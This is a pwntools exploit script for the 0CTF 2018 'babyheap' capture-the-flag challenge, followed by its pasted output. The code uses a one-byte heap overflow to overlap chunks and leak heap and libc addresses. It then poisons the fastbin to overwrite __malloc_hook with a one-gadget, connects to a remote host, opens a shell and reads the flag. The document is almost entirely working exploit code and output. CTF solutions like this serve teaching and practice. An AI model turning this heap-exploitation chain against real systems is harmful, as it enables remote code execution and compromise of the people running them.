from pwn import *


def allocate(size):
	r.sendline("1")
	r.recvuntil(": ")
	r.sendline(str(size))
	r.recvuntil(": ")


def update(idx,content):
	r.sendline("2")
	r.recvuntil(": ")
	r.sendline(str(idx))
	r.recvuntil(": ")
	r.sendline(str(len(content)))
	r.recvuntil(": ")
	r.send(content)
	r.recvuntil(": ")


def delete(idx):
	r.sendline("3")
	r.recvuntil(": ")
	r.sendline(str(idx))
	r.recvuntil(": ")


debug=False

if debug:
	r=process("./babyheap")
	#gdb.attach(r)
	libc=ELF("./libc-2.24_64.so")
	one=0x3f32a
	lib_diff=0x7f9b695c5b58-0x00007f9b6922d000
	#0x3f32a
	#0xd67cf
else:
	host="202.120.7.204"
	port=127
	r=remote(host,port)
	libc=ELF("./libc.so.6")
	one=0x3f35a
	lib_diff=0x000000000399B58
	#0x3f306
	#0x3f35a
	#0xd695f

r.recvuntil(": ")
#maximum is 88 
#can enter allocated+1 byte
allocate(24)#0
allocate(24)#1
allocate(24)#2
allocate(88)#3
allocate(0x40)#4
allocate(24) #garbage

delete(5)
#Extend 1
update(0,"Q"*24+"\x41")
#add 1 to 0x40 bin
delete(1)
allocate(48)
update(1,"X"*24+"\x21")
delete(2)

log.info("Leaking heap addr")
r.sendline("4")
r.recvuntil(": ")
r.sendline("1")
r.recvuntil("!\x00\x00\x00\x00\x00\x00\x00")
leak=r.recv(8)
heapleak=u64(leak)-0x110
log.info("Leaked heap addr :"+hex(heapleak))
log.info("If the leaked heap address is not start as 0x56...., you can kill it :(")

log.info("Leaking libc")
allocate(24)
update(1,"X"*24+"\xd1")
delete(2)
r.sendline("4")
r.recvuntil(": ")
r.sendline("1")
r.recvuntil("\xd1\x00\x00\x00\x00\x00\x00\x00")
leak=r.recv(8)
libc_leak=u64(leak)
log.info("Leaked libc :"+hex(libc_leak))
#libc_base=libc_leak-(0x7f9b695c5b58-0x00007f9b6922d000)
libc_base=libc_leak-lib_diff
log.info("Leaked libc base :"+hex(libc_base))
malloc_hook=libc_base+libc.symbols['__malloc_hook']
free_hook=libc_base+libc.symbols['__free_hook']
main_arena=malloc_hook+16
one=libc_base+one
log.info("__malloc_hook : "+ hex(malloc_hook))
log.info("__free_hook : "+ hex(free_hook))
log.info("main_arena : "+ hex(main_arena))
log.info("main_arena : "+ hex(main_arena))

#malloc_hook+21

allocate(0x40)

#update(2,"D"*16)
delete(2)

log.info("Hijacking main_arena")
update(1,"D"*24+p64(0x51)+p64(malloc_hook+21))


allocate(0x40)
allocate(72)
payload="\x00"*(67)+p64(malloc_hook-35)
payload=payload[:-2]
print len(payload)
update(5,payload)
allocate(88)
log.info("removing old 0x20 to clean up the list")
allocate(0x10)
allocate(0x10)

log.info("starting attack :)")

allocate(48)
update(9,"W"*19+p64(one))

sleep(2)
r.sendline("1")
r.sendline("1")
r.sendline("ls -al")

r.interactive()

# [+] Opening connection to 202.120.7.204 on port 127: Done
# [*] '/root/Desktop/CTF_Game/0ctf_2018/baby_heap/libc.so.6'
#     Arch:     amd64-64-little
#     RELRO:    Partial RELRO
#     Stack:    Canary found
#     NX:       NX enabled
#     PIE:      PIE enabled
# [*] Leaking heap addr
# [*] Leaked heap addr :0x562ecd700000
# [*] Leaking libc
# [*] Leaked libc :0x7f58a9390b58
# [*] Leaked libc base :0x7f58a8ff7000
# [*] __malloc_hook : 0x7f58a9390af0
# [*] __free_hook : 0x7f58a9392788
# [*] main_arena : 0x7f58a9390b00
# [*] main_arena : 0x7f58a9390b00
# [*] Hijacking main_arena
# 73
# [*] removing old 0x20 to clean up the list
# [*] starting attack :)
# [*] Switching to interactive mode
# Chunk 9 Updated
# 1. Allocate
# 2. UpdateSize: total 84
# drwxr-xr-x  22 root root  4096 Mar 14 09:48 .
# drwxr-xr-x  22 root root  4096 Mar 14 09:48 ..
# drwxr-xr-x   2 root root  4096 Mar 30 19:15 bin
# drwxr-xr-x   3 root root  4096 Mar 30 19:16 boot
# drwxr-xr-x  16 root root  2960 Mar 14 14:37 dev
# drwxr-xr-x  77 root root  4096 Mar 30 19:21 etc
# drwxr-xr-x   3 root root  4096 Mar 30 19:16 home
# lrwxrwxrwx   1 root root    29 Mar 14 09:48 initrd.img -> boot/initrd.img-4.9.0-6-amd64
# lrwxrwxrwx   1 root root    29 Mar 14 09:35 initrd.img.old -> boot/initrd.img-4.9.0-4-amd64
# drwxr-xr-x  14 root root  4096 Mar 14 09:40 lib
# drwxr-xr-x   2 root root  4096 Mar 28 21:47 lib64
# drwx------   2 root root 16384 Mar 14 09:35 lost+found
# drwxr-xr-x   3 root root  4096 Mar 14 09:35 media
# drwxr-xr-x   2 root root  4096 Mar 14 09:35 mnt
# drwxr-xr-x   2 root root  4096 Mar 14 09:35 opt
# dr-xr-xr-x 101 root root     0 Mar 14 14:37 proc
# drwx------   4 root root  4096 Mar 31 06:27 root
# drwxr-xr-x  17 root root   580 Mar 31 11:05 run
# drwxr-xr-x   2 root root  4096 Mar 30 19:15 sbin
# drwxr-xr-x   2 root root  4096 Mar 14 09:35 srv
# dr-xr-xr-x  13 root root     0 Mar 31 11:43 sys
# drwx-wx-wt   8 root root  4096 Apr  1 02:17 tmp
# drwxr-xr-x  10 root root  4096 Mar 14 09:35 usr
# drwxr-xr-x  11 root root  4096 Mar 14 09:35 var
# lrwxrwxrwx   1 root root    26 Mar 14 09:48 vmlinuz -> boot/vmlinuz-4.9.0-6-amd64
# lrwxrwxrwx   1 root root    26 Mar 14 09:35 vmlinuz.old -> boot/vmlinuz-4.9.0-4-amd64
# $ cat flag
# cat: flag: No such file or directory
# $ cd home
# $ ls
# babyheap
# $ cd babyheap
# $ cat flag
# flag{have_fun_with_fastbin}
# [*] Got EOF while reading in interactive
# $  
